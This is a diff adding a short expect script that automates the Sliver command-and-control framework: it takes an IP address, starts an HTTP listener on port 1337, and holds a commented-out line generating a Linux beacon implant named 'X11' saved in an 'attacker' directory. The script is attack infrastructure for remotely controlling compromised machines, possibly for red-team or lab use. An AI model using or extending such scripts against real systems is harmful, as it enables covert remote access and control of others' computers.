@@ -1,0 +1,17 @@
+#!/usr/bin/expect
+
+set timeout 80
+
+# Get IP Address
+set ip_address [lindex $argv 0]
+
+# Enter Sliver
+spawn sliver
+
+# Generate the Implant
+#send "generate beacon --http $ip_address:1337 --os linux --name X11 --save /home/attacker/Desktop/Implants/X11\r"
+
+# Generate the Listener
+send "http -d http://$ip_address:1337 -L $ip_address -l 1337\r"
+
+expect eof
